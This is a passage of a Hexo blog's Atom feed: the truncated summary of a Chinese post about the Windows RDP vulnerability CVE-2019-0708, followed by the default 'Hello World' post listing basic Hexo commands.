        &lt;h2 id=&quot;CVE-2019-0708&quot;&gt;&lt;a href=&quot;#CVE-2019-0708&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-0708&quot;&gt;&lt;/a&gt;CVE-2019-0708&lt;/h2&gt;&lt;p&gt;CVE-2019-0708是微软于5月14日公布的一
      
    
    </summary>
    
    
      <category term="安全漏洞" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="安全" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
      <category term="rdp" scheme="http://yoursite.com/tags/rdp/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/post/4a17b156.html"/>
    <id>http://yoursite.com/post/4a17b156.html</id>
    <published>2019-10-15T02:54:17.207Z</published>
    <updated>2019-10-18T07:11:19.498Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
